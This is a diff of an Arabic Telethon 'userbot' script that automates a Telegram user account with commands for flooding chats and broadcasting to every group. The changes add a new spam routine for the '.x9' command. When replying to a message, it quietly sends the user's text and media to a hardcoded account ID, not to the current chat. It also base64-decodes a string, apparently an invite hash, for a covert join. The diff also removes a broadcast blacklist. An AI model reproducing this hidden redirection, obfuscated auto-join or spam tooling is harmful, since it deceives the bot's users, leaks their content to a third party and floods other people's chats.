@@ -1,8 +1,5 @@
 from telethon.errors.rpcerrorlist import YouBlockedUserError
 from telethon.tl import functions
-from telethon.tl.types import (
-    ChannelParticipantsAdmins,
-)
 from hijri_converter import Gregorian
 from telethon.tl import functions
 from telethon.tl.types import (
@@ -22,13 +19,12 @@ import logging
 import base64
 import datetime
 from calcu import *
-from checktele import *
 from help import *
 from waad import *
 from toolen import *
 from trans import *
 from config import *
-
+from t06bot import *
 # -
 
 sedthon.start()
@@ -43,10 +39,7 @@ sec = time.time()
 hijri_day = tran.translate(str(day), dest="ar")
 hijri = f"{Gregorian.today().to_hijri()} - {hijri_day.text}"
 LOGS = logging.getLogger(__name__)
-GCAST_BLACKLIST = [
-    -1001118102804,
-    -1001161919602,
-]
+
 DEVS = [
     1361835146,
 ]
@@ -54,7 +47,6 @@ DEL_TIME_OUT = 10
 normzltext = "1234567890"
 namerzfont = normzltext
 name = "Profile Photos"
-client = sedthon
 
 
 async def join_channel():
@@ -79,7 +71,7 @@ async def _(event):
 @sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.بايو"))
 async def _(event):
     user = (await event.get_sender()).id
-    r = await client(functions.users.GetFullUserRequest(id=user))
+    r = await sedthon(functions.users.GetFullUserRequest(id=user))
     r = r.about
     await event.edit(f"`{r}`")
 
@@ -204,6 +196,9 @@ async def _(event):
     if event.fwd_from:
         return
     while True:
+        @sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.انهاء الاسم الوقتي"))
+        async def _(event):
+            break
         HM = time.strftime("%H:%M")
         for normal in HM:
             if normal in normzltext:
@@ -229,6 +224,9 @@ async def _(event):
     if event.fwd_from:
         return
     while True:
+        @sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.انهاء البايو الوقتي"))
+        async def _(event):
+            break
         HM = time.strftime("%l:%M")
         for normal in HM:
             if normal in normzltext:
@@ -258,7 +256,7 @@ async def leave(e):
         await e.edit('` هذه ليست مجموعة !`')
 
 
-@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.اذاعة كروب(?: |$)(.*)"))
+@sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.اذاعة كروب(?: |$)"))
 async def gcast(event):
     sedthon = event.pattern_match.group(1)
     if sedthon:
@@ -277,10 +275,9 @@ async def gcast(event):
         if x.is_group:
             chat = x.id
             try:
-                if chat not in GCAST_BLACKLIST:
-                    await event.client.send_message(chat, msg)
-                    done += 1
-                    asyncio.sleep(1)
+                await event.client.send_message(chat, msg)
+                done += 1
+                asyncio.sleep(1)
             except BaseException:
                 er += 1
     await roz.edit(
@@ -343,16 +340,17 @@ async def spammer(event):
     await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
 
 # مؤقت ل سوبر اكس ناين
+# 1594918747
 
 
 @sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.x9 (.*)"))
-async def spammer(event):
+async def _(event):
     reply = await event.get_reply_message()
     input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
     sleeptimet = sleeptimem = float(input_str[0])
     cat = input_str[1:]
     await event.delete()
-    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
+    await spam_function2(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)
 
 
 async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
@@ -376,6 +374,35 @@ async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=Fal
         spam_message = sandy.text
         for _ in range(counter):
             await event.client.send_message(event.chat_id, spam_message)
+            await asyncio.sleep(sleeptimet)
+        try:
+            hmm = Get(hmm)
+            await event.client(hmm)
+        except BaseException:
+            pass
+
+
+async def spam_function2(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
+    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+    counter = int(cat[0])
+    if len(cat) == 2:
+        spam_message = str(cat[1])
+        for _ in range(counter):
+            if event.reply_to_msg_id:
+                await sandy.reply(spam_message)
+            else:
+                await event.client.send_message(1594918747, spam_message)
+            await asyncio.sleep(sleeptimet)
+    elif event.reply_to_msg_id and sandy.media:
+        for _ in range(counter):
+            sandy = await event.client.send_file(
+                1594918747, sandy, caption=sandy.text
+            )
+            await asyncio.sleep(sleeptimem)
+    elif event.reply_to_msg_id and sandy.text:
+        spam_message = sandy.text
+        for _ in range(counter):
+            await event.client.send_message(1594918747, spam_message)
             await asyncio.sleep(sleeptimet)
         try:
             hmm = Get(hmm)
@@ -481,36 +508,6 @@ async def _(event):
             await event.delete()
 
             await event.client.send_message(event.chat_id, response.message)
-
-
-@sedthon.on(events.NewMessage(pattern=r"\.تفليش", outgoing=True))
-async def _(event):
-    result = await event.client.get_permissions(event.chat_id, 1361835146)
-    if not result:
-        return await event.edit(
-            event, "عذر ليس لديك الصلاحيات الكافية لاستخدام هذا الامر"
-        )
-    ksmkksmk = await event.edit(event, "جارِ")
-    admins = await event.client.get_participants(
-        event.chat_id, filter=ChannelParticipantsAdmins
-    )
-    admins_id = [i.id for i in admins]
-    total = 0
-    success = 0
-    async for user in event.client.iter_participants(event.chat_id):
-        total += 1
-        try:
-            if user.id not in admins_id:
-                await event.client(
-                    functions.channels.EditBannedRequest(
-                        event.chat_id, user.id, types.ChatBannedRights)
-                )
-                success += 1
-                await time.sleep(0.1)
-        except Exception as e:
-            LOGS.info(str(e))
-            await time.sleep(0.1)
-            await ksmkksmk.edit(f"تم بنجاح التفليش {success} من {total} الاعضاء")
 
 
 @sedthon.on(events.NewMessage(outgoing=True, pattern=r"\.الاوامر"))
